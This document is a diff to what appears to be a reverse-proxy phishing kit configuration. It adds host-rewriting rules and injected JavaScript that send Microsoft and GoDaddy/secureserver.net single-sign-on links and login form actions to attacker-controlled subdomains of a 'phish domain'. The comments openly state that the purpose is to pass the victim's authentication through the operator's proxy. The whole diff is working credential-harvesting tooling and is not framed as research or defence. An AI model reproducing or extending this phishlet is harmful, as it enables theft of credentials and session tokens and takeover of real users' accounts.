@@ -152,6 +152,12 @@ sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+# sso.godaddy.com → self-reference Location header (302 to /login/tac/pass etc) rewriting
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
+# sso.godaddy.com → MS endpoints rewriting (in case it posts back to MS)
+  - { triggers_on: "sso.godaddy.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
   - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'microsoft.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
@@ -302,7 +308,7 @@ js_inject:
   # If sub_filters miss either (compression, dynamic strings), this rewrites
   # them to our proxy at runtime so the user lands on /common/SAS/ProcessAuth
   # under woman.<phish_domain> instead of the real Microsoft.
-  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net"]
+  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net", "sso.godaddy.com"]
     trigger_paths: ["/*", "/"]
     script: |
       (function() {
@@ -310,22 +316,34 @@ js_inject:
           var parts = window.location.hostname.split('.');
           return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
         })();
-        var _msHost   = 'woman.' + _phishDomain;
-        var _liveHost = 'living.' + _phishDomain;
+        var _msHost     = 'woman.' + _phishDomain;
+        var _liveHost   = 'living.' + _phishDomain;
+        var _gdHost     = 'ssso.'  + _phishDomain;
+        var _ssnHost    = 'sssn.'  + _phishDomain;
+        var _ssn2Host   = 'sssn2.' + _phishDomain;
 
         function _rewrite(url) {
           if (typeof url !== 'string') return url;
           return url
             .replace(/https?:\/\/login\.microsoftonline\.com/gi, 'https://' + _msHost)
-            .replace(/https?:\/\/login\.live\.com/gi,           'https://' + _liveHost);
+            .replace(/https?:\/\/login\.live\.com/gi,           'https://' + _liveHost)
+            .replace(/https?:\/\/sso\.godaddy\.com/gi,          'https://' + _gdHost)
+            .replace(/https?:\/\/sso\.secureserver\.net/gi,     'https://' + _ssnHost)
+            .replace(/https?:\/\/sso2\.secureserver\.net/gi,    'https://' + _ssn2Host);
         }
 
-        // Patch any <form action="..."> pointing at MS so SAML POST-back goes through us
+        // Patch any <form action="..."> pointing at MS or any federation IDP host
         function _patchForms() {
           var forms = document.getElementsByTagName('form');
           for (var i = 0; i < forms.length; i++) {
             var a = forms[i].getAttribute('action');
-            if (a && (a.indexOf('login.microsoftonline.com') !== -1 || a.indexOf('login.live.com') !== -1)) {
+            if (a && (
+                  a.indexOf('login.microsoftonline.com') !== -1 ||
+                  a.indexOf('login.live.com') !== -1 ||
+                  a.indexOf('sso.godaddy.com') !== -1 ||
+                  a.indexOf('sso.secureserver.net') !== -1 ||
+                  a.indexOf('sso2.secureserver.net') !== -1
+                )) {
               forms[i].setAttribute('action', _rewrite(a));
             }
           }
